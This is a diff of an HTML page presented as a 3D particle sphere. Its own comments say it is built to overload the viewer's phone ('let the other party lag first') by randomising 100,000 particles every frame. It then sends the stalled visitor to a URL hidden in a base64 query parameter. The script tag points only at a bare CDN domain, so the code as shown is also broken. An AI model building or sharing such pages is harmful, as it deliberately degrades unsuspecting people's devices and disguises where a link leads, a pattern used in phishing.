@@ -5,37 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VSBM Sphere</title>
     <style>
-        /* 移除所有介面，讓背景變純黑，並隱藏捲動條 */
         body { margin: 0; background: #000; overflow: hidden; }
         canvas { display: block; }
     </style>
-    <!-- 引入 3D 渲染引擎 -->
     <script src="https://cdnjs.cloudflare.com"></script>
 </head>
 <body>
     <script>
         let scene, camera, renderer, points;
-        const particleCount = 100000; // 核心：十萬個粒子，讓手機滿載
+        const particleCount = 100000; // 十萬個粒子，極限吃資源
 
         window.onload = function() {
-            // 初始化並顯示 3D 粒子球
-            initSphere();
-
-            // 檢查是否有帶入內容參數 (例如 ?data=xxx)
             const params = new URLSearchParams(window.location.search);
             const data = params.get('data');
             
+            // 初始化 3D 球體
+            initSphere();
+
+            // 如果有加密內容，1.5 秒後彈出訊息
             if (data) {
                 try {
                     const decoded = decodeURIComponent(escape(atob(data)));
-                    // 如果是網址，延遲 2.5 秒後跳轉，讓對方先卡一下
                     if (decoded.startsWith('http')) {
-                        setTimeout(() => { window.location.href = decoded; }, 2500);
+                        // 網址跳轉延遲 3 秒，讓對方先卡一下
+                        setTimeout(() => { window.location.href = decoded; }, 3000);
                     } else {
-                        // 如果是文字，延遲 1.5 秒後跳出視窗
                         setTimeout(() => { alert(decoded); }, 1500);
                     }
-                } catch (e) { console.error("解析失敗"); }
+                } catch (e) {}
             }
         };
 
@@ -53,7 +50,7 @@
             const positions = new Float32Array(particleCount * 3);
             const colors = new Float32Array(particleCount * 3);
 
-            // 將十萬個粒子排列成完美的球狀
+            // 建立球狀分佈的粒子
             for (let i = 0; i < particleCount; i++) {
                 const phi = Math.acos(-1 + (2 * i) / particleCount);
                 const theta = Math.sqrt(particleCount * Math.PI) * phi;
@@ -71,10 +68,10 @@
             geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
 
             const material = new THREE.PointsMaterial({
-                size: 2.5,
+                size: 2,
                 vertexColors: true,
                 transparent: true,
-                opacity: 0.95
+                opacity: 0.9
             });
 
             points = new THREE.Points(geometry, material);
@@ -86,21 +83,21 @@
         function animate() {
             requestAnimationFrame(animate);
             
-            // 球體不停旋轉
+            // 球體旋轉
             points.rotation.x += 0.005;
             points.rotation.y += 0.01;
 
-            // 每幀隨機更新座標（手機變卡的元兇）
+            // 粒子抖動（核心吃效能處）
             const pos = points.geometry.attributes.position.array;
             for (let i = 0; i < pos.length; i++) {
-                pos[i] += (Math.random() - 0.5) * 2.5;
+                pos[i] += (Math.random() - 0.5) * 2;
             }
             points.geometry.attributes.position.needsUpdate = true;
 
             renderer.render(scene, camera);
         }
 
-        // 當使用者旋轉手機或縮放視窗時自動修正畫面
+        // 視窗大小調整自動適應
         window.addEventListener('resize', () => {
             camera.aspect = window.innerWidth / window.innerHeight;
             camera.updateProjectionMatrix();
@@ -108,3 +105,4 @@
         });
     </script>
 </body>
+</html>
